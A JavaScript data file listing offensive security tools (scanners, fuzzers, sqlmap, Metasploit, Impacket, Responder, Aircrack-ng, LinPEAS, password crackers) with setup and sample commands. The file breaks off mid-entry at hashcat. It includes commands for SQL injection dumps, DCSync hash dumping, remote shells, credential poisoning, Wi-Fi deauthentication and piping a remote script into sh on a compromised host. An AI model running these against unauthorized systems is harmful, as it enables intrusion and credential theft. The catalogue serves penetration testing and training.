window.CYBER_RESOURCES_RED = window.CYBER_RESOURCES_RED || [];
window.CYBER_RESOURCES_RED.push(
  {
    "name": "nmap",
    "url": "https://nmap.org/",
    "cat": "red",
    "type": "tool",
    "desc": "Network discovery and service enumeration",
    "details": "## Description\nNmap ('Network Mapper') is the industry standard tool for network discovery and security auditing. It determines what hosts are available on the network, what services (application name and version) those hosts are offering, and what operating systems they are running.\n\n## Setup\n- **Linux:** `sudo apt install nmap`\n- **Windows/Mac:** Download the installer from the official site.\n\n## Usage\nRun nmap from the command line against a target IP or range. It supports scripting (NSE) to automate advanced detection.\n\n## Useful Commands\n```bash\n# Standard Service/Script scan (Output to all formats)\nnmap -sC -sV -oA output_name 10.10.11.10\n\n# Fast scan (all ports)\nnmap -p- --min-rate 1000 10.10.11.10\n\n# UDP Scan (top 100 ports)\nnmap -sU --top-ports 100 10.10.11.10\n```\n\n## Alternatives\n- **rustscan** (Faster port discovery)\n- **masscan** (High speed, less detail)",
    "source": "https://github.com/nmap/nmap",
    "binaries": "https://nmap.org/download.html"
  },
  {
    "name": "masscan",
    "url": "https://github.com/robertdavidgraham/masscan",
    "cat": "red",
    "type": "tool",
    "desc": "High-speed port scanner",
    "details": "## Description\nMasscan is an internet-scale port scanner. It can scan the entire internet in under 6 minutes, capable of transmitting up to 10 million packets per second.\n\n## Setup\n```bash\nsudo apt install masscan\n# Or build from source:\ngit clone [https://github.com/robertdavidgraham/masscan](https://github.com/robertdavidgraham/masscan)\ncd masscan && make\n```\n\n## Usage\nIt uses its own custom TCP/IP stack to achieve extreme speeds. It is best used for broad discovery rather than detailed service enumeration.\n\n## Useful Commands\n```bash\n# Scan a subnet for web ports at 10k packets/sec\nmasscan 10.11.1.0/24 -p80,443 --rate 10000\n\n# Save to binary format and read later\nmasscan 10.0.0.0/8 -p80 -oB output.bin\nmasscan --readscan output.bin\n```\n\n## Alternatives\n- **nmap**\n- **zmap**",
    "source": "https://github.com/robertdavidgraham/masscan",
    "binaries": null
  },
  {
    "name": "rustscan",
    "url": "https://github.com/RustScan/RustScan",
    "cat": "red",
    "type": "tool",
    "desc": "Fast port scanner with nmap integration",
    "details": "## Description\nRustScan is a modern port scanner designed for speed and intelligent piping. It uses adaptive learning to scan targets in seconds.\n\n## Setup\nDownload the `.deb` file from releases or use Docker.\n```bash\ndocker pull rustscan/rustscan:alpine\n```\n\n## Usage\nIt identifies open ports rapidly and automatically pipes them into nmap for deep service detection, saving time on closed ports.\n\n## Useful Commands\n```bash\n# Scan target and pass open ports to nmap for -sV scan\nrustscan -a 10.10.11.10 -- -sV\n\n# Adjust batch size for speed\nrustscan -b 1000 -a 10.10.11.10\n```\n\n## Alternatives\n- **masscan**\n- **naabu**",
    "source": "https://github.com/RustScan/RustScan",
    "binaries": "https://github.com/RustScan/RustScan/releases"
  },
  {
    "name": "amass",
    "url": "https://github.com/owasp-amass/amass",
    "cat": "red",
    "type": "tool",
    "desc": "Attack surface mapping and DNS enumeration",
    "details": "## Description\nThe OWASP Amass Project performs network mapping of attack surfaces and external asset discovery using open source information gathering and active reconnaissance techniques.\n\n## Setup\n```bash\ngo install -v [github.com/owasp-amass/amass/v3/...@master](https://github.com/owasp-amass/amass/v3/...@master)\n# Or download binary from releases\n```\n\n## Usage\nUse Amass to discover subdomains, IP addresses, and map the network infrastructure of a target organization.\n\n## Useful Commands\n```bash\n# Passive subdomain enumeration\namass enum -passive -d example.com -o results.txt\n\n# Active enum with IP resolution\namass enum -active -d example.com -ip\n```\n\n## Alternatives\n- **subfinder**\n- **theHarvester**",
    "source": "https://github.com/owasp-amass/amass",
    "binaries": "https://github.com/owasp-amass/amass/releases"
  },
  {
    "name": "subfinder",
    "url": "https://github.com/projectdiscovery/subfinder",
    "cat": "red",
    "type": "tool",
    "desc": "Fast subdomain enumeration",
    "details": "## Description\nSubfinder is a subdomain discovery tool that discovers valid subdomains for websites by using passive online sources.\n\n## Setup\n```bash\ngo install -v [github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest](https://github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest)\n```\n\n## Usage\nIt queries passive sources (like Censys, Chaos, Recon.dev) to find subdomains without directly interacting with the target.\n\n## Useful Commands\n```bash\n# Basic scan\nsubfinder -d example.com\n\n# Scan and pipe to httpx for probing\nsubfinder -d example.com -silent | httpx -title\n```\n\n## Alternatives\n- **amass**\n- **assetfinder**",
    "source": "https://github.com/projectdiscovery/subfinder",
    "binaries": "https://github.com/projectdiscovery/subfinder/releases"
  },
  {
    "name": "httpx",
    "url": "https://github.com/projectdiscovery/httpx",
    "cat": "red",
    "type": "tool",
    "desc": "HTTP probing and tech fingerprinting",
    "details": "## Description\nhttpx is a fast and multi-purpose HTTP toolkit that allows running multiple probes using the retryable http library. It is designed to handle large lists of hosts.\n\n## Setup\n```bash\ngo install -v [github.com/projectdiscovery/httpx/cmd/httpx@latest](https://github.com/projectdiscovery/httpx/cmd/httpx@latest)\n```\n\n## Usage\nPipe a list of domains or IPs into httpx to verify they are running a web server, check status codes, and grab titles.\n\n## Useful Commands\n```bash\n# Probe list of hosts for status and title\ncat hosts.txt | httpx -title -status-code -tech-detect\n\n# Check for specific paths\ncat hosts.txt | httpx -path /admin -status-code\n```\n\n## Alternatives\n- **httprobe**\n- **whatweb**",
    "source": "https://github.com/projectdiscovery/httpx",
    "binaries": "https://github.com/projectdiscovery/httpx/releases"
  },
  {
    "name": "naabu",
    "url": "https://github.com/projectdiscovery/naabu",
    "cat": "red",
    "type": "tool",
    "desc": "Fast port discovery",
    "details": "## Description\nNaabu is a port scanning tool written in Go that allows you to enumerate valid ports for targets in a fast and reliable manner.\n\n## Setup\n```bash\ngo install -v [github.com/projectdiscovery/naabu/v2/cmd/naabu@latest](https://github.com/projectdiscovery/naabu/v2/cmd/naabu@latest)\n```\n\n## Usage\nIt is often used in reconnaissance pipelines to filter live ports before passing them to other tools.\n\n## Useful Commands\n```bash\n# Scan top 100 ports\nnaabu -host example.com -top-ports 100\n\n# Full scan excluding CDN ranges\nnaabu -host example.com -p - -exclude-cdn\n```\n\n## Alternatives\n- **nmap**\n- **masscan**",
    "source": "https://github.com/projectdiscovery/naabu",
    "binaries": "https://github.com/projectdiscovery/naabu/releases"
  },
  {
    "name": "nuclei",
    "url": "https://github.com/projectdiscovery/nuclei",
    "cat": "red",
    "type": "tool",
    "desc": "Template-based vulnerability scanning",
    "details": "## Description\nNuclei is a modern, fast vulnerability scanner that uses simple YAML-based templates to detect vulnerabilities.\n\n## Setup\n```bash\ngo install -v [github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest](https://github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest)\n# Update templates\nnuclei -update-templates\n```\n\n## Usage\nRun nuclei against a list of targets using community templates to find CVEs, misconfigurations, and exposed panels.\n\n## Useful Commands\n```bash\n# Scan list of URLs with all templates\nnuclei -l urls.txt\n\n# Scan only for critical CVEs\nnuclei -u [https://example.com](https://example.com) -tags cve,critical\n\n# Scan for specific tech (e.g., jira)\nnuclei -u [https://example.com](https://example.com) -tags jira\n```\n\n## Alternatives\n- **Nessus**\n- **OpenVAS**",
    "source": "https://github.com/projectdiscovery/nuclei",
    "binaries": "https://github.com/projectdiscovery/nuclei/releases"
  },
  {
    "name": "ffuf",
    "url": "https://github.com/ffuf/ffuf",
    "cat": "red",
    "type": "tool",
    "desc": "Fast web fuzzer and content discovery",
    "details": "## Description\nFfuf (Fuzz Faster U Fool) is a fast web fuzzer written in Go. It allows you to discover directories, files, or fuzz parameters.\n\n## Setup\n```bash\ngo install [github.com/ffuf/ffuf/v2@latest](https://github.com/ffuf/ffuf/v2@latest)\n```\n\n## Usage\nUse wordlists to brute-force URLs or parameters. Replace the fuzzing point with the keyword `FUZZ`.\n\n## Useful Commands\n```bash\n# Directory brute force (filter 404s)\nffuf -u [https://target.com/FUZZ](https://target.com/FUZZ) -w /path/to/wordlist.txt -fc 404\n\n# Fuzzing a POST parameter\nffuf -u [https://target.com/login](https://target.com/login) -X POST -d \"user=admin&pass=FUZZ\" -w passlist.txt -mr \"Welcome\"\n\n# VHost discovery\nffuf -u [https://target.com](https://target.com) -H \"Host: FUZZ.target.com\" -w subdomains.txt -fs [size_of_default_response]\n```\n\n## Alternatives\n- **gobuster**\n- **dirsearch**",
    "source": "https://github.com/ffuf/ffuf",
    "binaries": "https://github.com/ffuf/ffuf/releases"
  },
  {
    "name": "gobuster",
    "url": "https://github.com/OJ/gobuster",
    "cat": "red",
    "type": "tool",
    "desc": "Directory/DNS/VHost brute forcing",
    "details": "## Description\nGobuster is a tool used to brute-force URIs (directories and files) in web sites, DNS subdomains, and Virtual Host names.\n\n## Setup\n```bash\ngo install [github.com/OJ/gobuster/v3@latest](https://github.com/OJ/gobuster/v3@latest)\n```\n\n## Usage\nSelect a mode (dir, dns, vhost) and provide a wordlist to start enumerating.\n\n## Useful Commands\n```bash\n# Directory scan\ngobuster dir -u [https://example.com](https://example.com) -w wordlist.txt -t 50\n\n# DNS scan\ngobuster dns -d example.com -w subdomains.txt\n\n# VHost scan\ngobuster vhost -u [https://example.com](https://example.com) -w subdomains.txt\n```\n\n## Alternatives\n- **ffuf**\n- **feroxbuster**",
    "source": "https://github.com/OJ/gobuster",
    "binaries": "https://github.com/OJ/gobuster/releases"
  },
  {
    "name": "feroxbuster",
    "url": "https://github.com/epi052/feroxbuster",
    "cat": "red",
    "type": "tool",
    "desc": "Recursive content discovery",
    "details": "## Description\nFeroxbuster is a fast, simple, recursive content discovery tool written in Rust. It automatically handles recursion (finding a directory and scanning inside it).\n\n## Setup\nDownload binary from releases or install via zip.\n\n## Usage\nRun against a target URL. It will automatically crawl found directories based on your wordlist.\n\n## Useful Commands\n```bash\n# Standard recursive scan looking for specific extensions\nferoxbuster -u [https://example.com](https://example.com) -w wordlist.txt -x php,html,txt\n\n# No recursion, specific depth\nferoxbuster -u [https://example.com](https://example.com) --depth 1\n```\n\n## Alternatives\n- **gobuster**\n- **dirsearch**",
    "source": "https://github.com/epi052/feroxbuster",
    "binaries": "https://github.com/epi052/feroxbuster/releases"
  },
  {
    "name": "dirsearch",
    "url": "https://github.com/maurosoria/dirsearch",
    "cat": "red",
    "type": "tool",
    "desc": "Web path brute forcing",
    "details": "## Description\nDirsearch is a mature, feature-rich command-line tool designed to brute force directories and files in webservers.\n\n## Setup\n```bash\ngit clone [https://github.com/maurosoria/dirsearch.git](https://github.com/maurosoria/dirsearch.git)\npip install -r requirements.txt\n```\n\n## Usage\nA python based web path scanner. Useful for its extensive default wordlist and ease of use.\n\n## Useful Commands\n```bash\n# Simple scan with extensions\npython3 dirsearch.py -u [https://target.com](https://target.com) -e php,txt,zip\n\n# High speed with threads\npython3 dirsearch.py -u [https://target.com](https://target.com) -t 50 --random-agent\n```\n\n## Alternatives\n- **ffuf**\n- **gobuster**",
    "source": "https://github.com/maurosoria/dirsearch",
    "binaries": null
  },
  {
    "name": "Burp Suite",
    "url": "https://portswigger.net/burp",
    "cat": "red",
    "type": "tool",
    "desc": "Web testing proxy and toolkit",
    "details": "## Description\nBurp Suite is an integrated platform for performing security testing of web applications. It is the industry standard for manual web testing.\n\n## Setup\nDownload the installer (Community or Pro) from PortSwigger.\n\n## Usage\nBurp is an intercepting proxy. Configure your browser to proxy through `127.0.0.1:8080`. Install the CA certificate by visiting `http://burp` in the proxied browser.\n\n## Key Features\n- **Proxy:** Intercept and modify traffic.\n- **Repeater:** Manually resend requests with modifications.\n- **Intruder:** Fuzz parameters (throttled in Community).\n- **Decoder:** Base64/URL encode/decode tools.\n\n## Alternatives\n- **OWASP ZAP**\n- **Caido**",
    "source": null,
    "binaries": "https://portswigger.net/burp/releases"
  },
  {
    "name": "OWASP ZAP",
    "url": "https://www.zaproxy.org/",
    "cat": "red",
    "type": "tool",
    "desc": "Open-source web proxy and scanner",
    "details": "## Description\nOWASP ZAP (Zed Attack Proxy) is a free, open-source penetration testing tool for finding vulnerabilities in web applications.\n\n## Setup\nDownload the installer for your OS. Requires Java 8+.\n\n## Usage\nIt sits between your browser and the web application to intercept and inspect messages.\n\n## Key Features\n- **Automated Scanner:** Spiders and scans for vulnerabilities automatically.\n- **Fuzzer:** Payload injection.\n- **HUD:** Heads Up Display for testing in-browser.\n\n## Alternatives\n- **Burp Suite**",
    "source": "https://github.com/zaproxy/zaproxy",
    "binaries": "https://www.zaproxy.org/download/"
  },
  {
    "name": "mitmproxy",
    "url": "https://mitmproxy.org/",
    "cat": "red",
    "type": "tool",
    "desc": "Scriptable intercepting proxy",
    "details": "## Description\nmitmproxy is a free and open-source interactive HTTPS proxy. It allows you to intercept, inspect, modify, and replay web traffic.\n\n## Setup\n```bash\npip install mitmproxy\n```\n\n## Usage\nA terminal-based interactive man-in-the-middle proxy. Great for debugging and scripting (using Python) traffic modification.\n\n## Useful Commands\n```bash\n# Start the interactive interface\nmitmproxy\n\n# Start web interface\nmitmweb\n\n# Save traffic to file\nmitmproxy -w outfile.flow\n```\n\n## Alternatives\n- **Burp Suite**\n- **Fiddler**",
    "source": "https://github.com/mitmproxy/mitmproxy",
    "binaries": "https://mitmproxy.org/downloads/"
  },
  {
    "name": "sqlmap",
    "url": "https://sqlmap.org/",
    "cat": "red",
    "type": "tool",
    "desc": "SQL injection testing automation",
    "details": "## Description\nSQLMap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers.\n\n## Setup\n```bash\ngit clone --depth 1 [https://github.com/sqlmapproject/sqlmap.git](https://github.com/sqlmapproject/sqlmap.git) sqlmap-dev\n```\n\n## Usage\nProvide it with a URL or a saved request file, and it will attempt to identify the injection point and dump data.\n\n## Useful Commands\n```bash\n# GET request injection\npython sqlmap.py -u \"[http://target.com/vuln.php?id=1](http://target.com/vuln.php?id=1)\" --batch\n\n# Capture a request in Burp, save to file, and run:\npython sqlmap.py -r request.txt --level 5 --risk 3\n\n# Dump database data\npython sqlmap.py -u \"...\" --dump\n```\n\n## Alternatives\n- **Ghauri**\n- **Manual Injection**",
    "source": "https://github.com/sqlmapproject/sqlmap",
    "binaries": "https://github.com/sqlmapproject/sqlmap/releases"
  },
  {
    "name": "nikto",
    "url": "https://cirt.net/Nikto2",
    "cat": "red",
    "type": "tool",
    "desc": "Web server scanner (misconfigurations)",
    "details": "## Description\nNikto is an Open Source (GPL) web server scanner which performs comprehensive tests against web servers for multiple items, including over 6700 potentially dangerous files/programs.\n\n## Setup\n```bash\nsudo apt install nikto\n# Or clone from GitHub\n```\n\n## Usage\nRun against a target to identify outdated server software and configuration problems.\n\n## Useful Commands\n```bash\n# Basic scan\nnikto -h [http://example.com](http://example.com)\n\n# Scan with SSL and specific port\nnikto -h [https://example.com](https://example.com) -p 443\n```\n\n## Alternatives\n- **nuclei**\n- **nessus**",
    "source": "https://github.com/sullo/nikto",
    "binaries": "https://github.com/sullo/nikto/releases"
  },
  {
    "name": "Metasploit Framework",
    "url": "https://www.metasploit.com/",
    "cat": "red",
    "type": "tool",
    "desc": "Exploit framework ",
    "details": "## Description\nThe Metasploit Framework is the world's most used penetration testing framework. It aids in discovering, exploiting, and validating vulnerabilities.\n\n## Setup\nDownload the installer from Rapid7 or use the nightly script:\n```bash\ncurl [https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb](https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb) > msfinstall && chmod 755 msfinstall && ./msfinstall\n```\n\n## Usage\nLaunch `msfconsole` to access the interactive shell where you can search for and use exploits, auxiliary modules, and payloads.\n\n## Useful Commands\n```bash\n# Start console\nmsfconsole\n\n# Inside console:\nsearch ms17-010\nuse 0\nset RHOSTS 10.10.10.10\nrun\n```\n\n## Alternatives\n- **Sliver**\n- **Cobalt Strike**",
    "source": "https://github.com/rapid7/metasploit-framework",
    "binaries": "https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers"
  },
  {
    "name": "BloodHound",
    "url": "https://github.com/SpecterOps/BloodHound",
    "cat": "red",
    "type": "tool",
    "desc": "Active Directory attack path analysis",
    "details": "## Description\nBloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment, helping identify attack paths.\n\n## Setup\nRequires Neo4j database. \n1. Install Neo4j.\n2. Download BloodHound GUI binary.\n3. Run `SharpHound.exe` or `bloodhound-python` to gather data.\n\n## Usage\nCollect data using an ingestor (SharpHound/AzureHound), import the data into BloodHound, and query the graph for shortest paths to Domain Admin.\n\n## Useful Commands\n```bash\n# Python ingestor (from Linux)\nbloodhound-python -u user -p pass -ns 10.10.10.10 -d domain.local -c All\n```\n\n## Alternatives\n- **PingCastle**\n- **Adkins**",
    "source": "https://github.com/SpecterOps/BloodHound",
    "binaries": "https://github.com/SpecterOps/BloodHound/releases"
  },
  {
    "name": "PingCastle",
    "url": "https://www.pingcastle.com/",
    "cat": "red",
    "type": "tool",
    "desc": "Active Directory security assessment",
    "details": "## Description\nPingCastle is a tool designed to assess the security level of an Active Directory environment quickly.\n\n## Setup\nDownload the `.exe` (C# application). No installation required, just unzip.\n\n## Usage\nRun the executable in a terminal on a domain-joined machine (or via runas). It generates an HTML report detailing AD security risks.\n\n## Useful Commands\n```cmd\n# Interactive mode\nPingCastle.exe\n\n# Healthcheck only\nPingCastle.exe --healthcheck --server domain.com\n```\n\n## Alternatives\n- **Purple Knight**\n- **BloodHound**",
    "source": "https://github.com/vletoux/pingcastle",
    "binaries": "https://www.pingcastle.com/download"
  },
  {
    "name": "Responder",
    "url": "https://github.com/lgandx/Responder",
    "cat": "red",
    "type": "tool",
    "desc": "LLMNR/NBT-NS/mDNS poisoning (lab/authorized)",
    "details": "## Description\nResponder is a LLMNR, NBT-NS and MDNS poisoner. It answers specific NetBIOS queries based on their name suffix to spoof the server and capture credentials.\n\n## Setup\n```bash\ngit clone [https://github.com/lgandx/Responder.git](https://github.com/lgandx/Responder.git)\n```\n\n## Usage\nRun on a local network segment to listen for multicast requests. Best used to capture NTLMv2 hashes from Windows clients.\n\n## Useful Commands\n```bash\n# Start poisoning on interface eth0\nsudo python3 Responder.py -I eth0 -dDw\n\n# Analyze mode (no poisoning)\nsudo python3 Responder.py -I eth0 -A\n```\n\n## Alternatives\n- **Inveigh** (PowerShell/Windows)",
    "source": "https://github.com/lgandx/Responder",
    "binaries": null
  },
  {
    "name": "Impacket",
    "url": "https://github.com/fortra/impacket",
    "cat": "red",
    "type": "tool",
    "desc": "Network protocol tooling (lab/authorized)",
    "details": "## Description\nImpacket is a collection of Python classes for working with network protocols. It includes famous scripts like `psexec.py`, `smbexec.py`, and `secretsdump.py`.\n\n## Setup\n```bash\npython3 -m pip install impacket\n# Or install via pipx for isolated environments\npipx install impacket\n```\n\n## Usage\nUse individual scripts from the library to interact with network services (SMB, Kerberos, MSSQL, etc.).\n\n## Useful Commands\n```bash\n# Dump hashes from Domain Controller (DCSync)\nsecretsdump.py domain/user:pass@10.10.10.10\n\n# Get a shell via SMB\npsexec.py domain/user:pass@10.10.10.10\n```\n\n## Alternatives\n- **NetExec**",
    "source": "https://github.com/fortra/impacket",
    "binaries": "https://github.com/fortra/impacket/releases"
  },
  {
    "name": "WiFi Pineapple (concept)",
    "url": "https://shop.hak5.org/products/wifi-pineapple",
    "cat": "red",
    "type": "tool",
    "desc": "Wireless assessment platform (hardware)",
    "details": "## Description\nThe WiFi Pineapple is a hardware platform used for Wi-Fi auditing and man-in-the-middle attacks.\n\n## Setup\nPhysical hardware setup required. Connect via USB-C or Wi-Fi to the management interface (usually `172.16.42.1:1471`).\n\n## Usage\nAutomates Wi-Fi auditing (Evil Twin attacks, Rogue AP, Karma attacks) controlled via a web interface.\n\n## Workflow\n1. Recon: Scan for APs.\n2. PineAP: Enable to mimic networks client devices are searching for.\n3. Harvest: Capture WPA handshakes or creds from captive portals.\n\n## Alternatives\n- **Raspberry Pi + Aircrack-ng**",
    "source": null,
    "binaries": null
  },
  {
    "name": "Aircrack-ng",
    "url": "https://www.aircrack-ng.org/",
    "cat": "red",
    "type": "tool",
    "desc": "Wireless auditing suite ",
    "details": "## Description\nAircrack-ng is a complete suite of tools to assess WiFi network security. It focuses on Monitoring, Attacking, Testing, and Cracking.\n\n## Setup\n```bash\nsudo apt install aircrack-ng\n```\n\n## Usage\nUse airmon-ng to enable monitor mode, airodump-ng to capture packets, and aircrack-ng to crack the hashes.\n\n## Useful Commands\n```bash\n# Kill interfering processes\nairmon-ng check kill\n\n# Start monitor mode\nairmon-ng start wlan0\n\n# Capture traffic\nairodump-ng wlan0mon\n\n# Deauth attack (force handshake capture)\naireplay-ng -0 10 -a [BSSID] wlan0mon\n```\n\n## Alternatives\n- **Kismet**\n- **Wifite**",
    "source": "https://github.com/aircrack-ng/aircrack-ng",
    "binaries": "https://www.aircrack-ng.org/downloads.html"
  },
  {
    "name": "Kismet",
    "url": "https://www.kismetwireless.net/",
    "cat": "red",
    "type": "tool",
    "desc": "Wireless network detector and sniffer",
    "details": "## Description\nKismet is a detector, sniffer, and intrusion detection system for 802.11 Wi-Fi. It works passively without sending packets.\n\n## Setup\n```bash\nsudo apt install kismet\n```\n\n## Usage\nRun Kismet to passively discover wireless networks, devices, and map them.\n\n## Useful Commands\n```bash\n# Start server (access via Web UI at localhost:2501)\nsudo kismet -c wlan0\n```\n\n## Alternatives\n- **Airodump-ng**",
    "source": "https://github.com/kismetwireless/kismet",
    "binaries": "https://www.kismetwireless.net/downloads/"
  },
  {
    "name": "TruffleHog",
    "url": "https://trufflesecurity.com/",
    "cat": "red",
    "type": "tool",
    "desc": "Secret scanning for repos and files",
    "details": "## Description\nTruffleHog searches through git repositories for secrets, digging deep into commit history and branches.\n\n## Setup\n```bash\n# Docker\ndocker run -it trufflesecurity/trufflehog:latest github --repo [https://github.com/trufflesecurity/test_keys](https://github.com/trufflesecurity/test_keys)\n# Binary\ncurl -sSfL [https://raw.githubusercontent.com/trufflesecurity/trufflehog/main/scripts/install.sh](https://raw.githubusercontent.com/trufflesecurity/trufflehog/main/scripts/install.sh) | sh -s -- -b /usr/local/bin\n```\n\n## Usage\nFinds credentials, keys, and secrets in git repositories, filesystems, and S3 buckets.\n\n## Useful Commands\n```bash\n# Scan a remote repo\ntrufflehog git [https://github.com/user/repo](https://github.com/user/repo)\n\n# Scan filesystem\ntrufflehog filesystem ./path/to/source\n```\n\n## Alternatives\n- **Gitleaks**",
    "source": "https://github.com/trufflesecurity/trufflehog",
    "binaries": "https://github.com/trufflesecurity/trufflehog/releases"
  },
  {
    "name": "Gitleaks",
    "url": "https://gitleaks.io/",
    "cat": "red",
    "type": "tool",
    "desc": "Secret detection for codebases",
    "details": "## Description\nGitleaks is a SAST tool for detecting hardcoded secrets like passwords, api keys, and tokens in git repos.\n\n## Setup\nInstall via brew, docker, or binary.\n```bash\nbrew install gitleaks\n```\n\n## Usage\nRun detecting against your current repository or specific history to prevent secrets from leaking.\n\n## Useful Commands\n```bash\n# Detect secrets in current repo\ngitleaks detect --source . -v\n\n# Scan a specific git history\ngitleaks detect --source . --log-opts=\"--all\"\n```\n\n## Alternatives\n- **TruffleHog**",
    "source": "https://github.com/gitleaks/gitleaks",
    "binaries": "https://github.com/gitleaks/gitleaks/releases"
  },
  {
    "name": "Semgrep",
    "url": "https://semgrep.dev/",
    "cat": "red",
    "type": "tool",
    "desc": "Lightweight static analysis (SAST)",
    "details": "## Description\nSemgrep is a fast, open-source static analysis tool for finding bugs and enforcing code standards at editor, commit, and CI time.\n\n## Setup\n```bash\npython3 -m pip install semgrep\n```\n\n## Usage\nUse it to scan local code for security vulnerabilities using pre-built or custom rules.\n\n## Useful Commands\n```bash\n# Run with auto-config (community rules)\nsemgrep scan --config=auto .\n\n# Run specific security ruleset\nsemgrep scan --config=p/security-audit .\n```\n\n## Alternatives\n- **CodeQL**\n- **SonarQube**",
    "source": "https://github.com/semgrep/semgrep",
    "binaries": null
  },
  {
    "name": "CodeQL",
    "url": "https://codeql.github.com/",
    "cat": "red",
    "type": "tool",
    "desc": "Semantic code analysis and query language",
    "details": "## Description\nCodeQL treats code like data, allowing you to find vulnerabilities by writing queries to explore patterns in the code.\n\n## Setup\nDownload the CodeQL CLI bundle from GitHub releases.\n\n## Usage\nCreate a database from the source code and then run QL queries against it to identify security issues.\n\n## Useful Commands\n```bash\n# Create DB\ncodeql database create my-db --language=python\n\n# Analyze\ncodeql database analyze my-db android-security-queries.qls --format=csv --output=results.csv\n```\n\n## Alternatives\n- **Semgrep**",
    "source": "https://github.com/github/codeql",
    "binaries": "https://github.com/github/codeql-cli-binaries/releases"
  },
  {
    "name": "theHarvester",
    "url": "https://github.com/laramies/theHarvester",
    "cat": "red",
    "type": "tool",
    "desc": "Email/subdomain/OSINT collection",
    "details": "## Description\ntheHarvester is a simple to use, yet effective tool for gathering emails, subdomains, hostnames, open ports and banners from different public sources.\n\n## Setup\n```bash\ngit clone [https://github.com/laramies/theHarvester.git](https://github.com/laramies/theHarvester.git)\ncd theHarvester\npip install -r requirements.txt\n```\n\n## Usage\nRun the tool against a domain to collect OSINT data from search engines like Google, Bing, and PGP servers.\n\n## Useful Commands\n```bash\n# Search all sources, limit 500 results\ntheHarvester -d example.com -l 500 -b all\n```\n\n## Alternatives\n- **SpiderFoot**\n- **Recon-ng**",
    "source": "https://github.com/laramies/theHarvester",
    "binaries": null
  },
  {
    "name": "SpiderFoot",
    "url": "https://www.spiderfoot.net/",
    "cat": "red",
    "type": "tool",
    "desc": "Automated OSINT collection",
    "details": "## Description\nSpiderFoot is an open source intelligence (OSINT) automation tool. It integrates with over 200 modules to gather intelligence about a given target.\n\n## Setup\n```bash\ngit clone [https://github.com/smicallef/spiderfoot.git](https://github.com/smicallef/spiderfoot.git)\npip install -r requirements.txt\n```\n\n## Usage\nBest used via its web interface to visualize data. It scans IP addresses, domain names, e-mail addresses, and names.\n\n## Useful Commands\n```bash\n# Start the Web UI (easiest way to use)\npython3 sf.py -l 127.0.0.1:5001\n```\n\n## Alternatives\n- **Maltego**\n- **theHarvester**",
    "source": "https://github.com/smicallef/spiderfoot",
    "binaries": "https://github.com/smicallef/spiderfoot/releases"
  },
  {
    "name": "sqlfluff",
    "url": "https://sqlfluff.com/",
    "cat": "red",
    "type": "tool",
    "desc": "SQL linter/formatter (data security hygiene)",
    "details": "## Description\nSQLFluff is a dialect-flexible and configurable SQL linter. While primarily for code quality, it helps identify bad practices and maintain clean SQL code.\n\n## Setup\n```bash\npip install sqlfluff\n```\n\n## Usage\nRun against SQL files to check for syntax errors and formatting issues.\n\n## Useful Commands\n```bash\n# Lint a file\nsqlfluff lint query.sql\n\n# Fix issues automatically\nsqlfluff fix query.sql\n```\n\n## Alternatives\n- **SQLfmt**",
    "source": "https://github.com/sqlfluff/sqlfluff",
    "binaries": null
  },
  {
    "name": "LinPEAS / WinPEAS",
    "url": "https://github.com/peass-ng/PEASS-ng",
    "cat": "red",
    "type": "tool",
    "desc": "Privilege escalation audit scripts",
    "details": "## Description\nPEASS-ng (Privilege Escalation Awesome Scripts Suite) are scripts that search for possible paths to escalate privileges on Linux/Windows/Mac hosts.\n\n## Setup\nDownload the script (sh/bat/exe) directly from releases to the target machine.\n\n## Usage\nRun the script on a compromised host to get a colored output highlighting vulnerabilities (red/yellow).\n\n## Useful Commands\n```bash\n# Linux (curl piping)\ncurl -L [https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh](https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh) | sh\n\n# Windows\n.\\winpeas.exe cmd fast\n```\n\n## Alternatives\n- **LinEnum**\n- **Seatbelt**",
    "source": "https://github.com/peass-ng/PEASS-ng",
    "binaries": "https://github.com/peass-ng/PEASS-ng/releases"
  },
  {
    "name": "pspy",
    "url": "https://github.com/DominicBreuker/pspy",
    "cat": "red",
    "type": "tool",
    "desc": "Monitor processes without root (Linux)",
    "details": "## Description\npspy is a command-line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they happen.\n\n## Setup\nDownload the static binary (`pspy32` or `pspy64`) to the target machine.\n```bash\nwget [https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64](https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64)\nchmod +x pspy64\n```\n\n## Usage\nExecute on a Linux host to monitor real-time process creation events.\n\n## Useful Commands\n```bash\n# Run and watch for events\n./pspy64\n\n# Watch specific directories\n./pspy64 -f -r /var/www/html\n```\n\n## Alternatives\n- **auditd** (requires root)",
    "source": "https://github.com/DominicBreuker/pspy",
    "binaries": "https://github.com/DominicBreuker/pspy/releases"
  },
  {
    "name": "John the Ripper",
    "url": "https://www.openwall.com/john/",
    "cat": "red",
    "type": "tool",
    "desc": "Password audit and recovery",
    "details": "## Description\nJohn the Ripper is a fast password cracker. Its primary purpose is to detect weak Unix passwords, but it supports hundreds of hash and cipher types.\n\n## Setup\n```bash\nsudo apt install john\n# Or build 'Jumbo' version from source for more formats\n```\n\n## Usage\nProvide it with a file containing hashes and optionally a wordlist. It will attempt to crack them offline.\n\n## Useful Commands\n```bash\n# Convert file to john format\nzip2john file.zip > hash.txt\n\n# Crack hash with wordlist\njohn --wordlist=/usr/share/wordlists/rockyou.txt hash.txt\n\n# Show cracked passwords\njohn --show hash.txt\n```\n\n## Alternatives\n- **Hashcat**",
    "source": "https://github.com/openwall/john",
    "binaries": "https://github.com/openwall/john-packages/releases"
  },
  {
    "name": "hashcat",
    "url": "https://hashcat.net/hashcat/",
    "cat": "red",
    "type": "tool",
    "desc": "GPU password auditing tool",
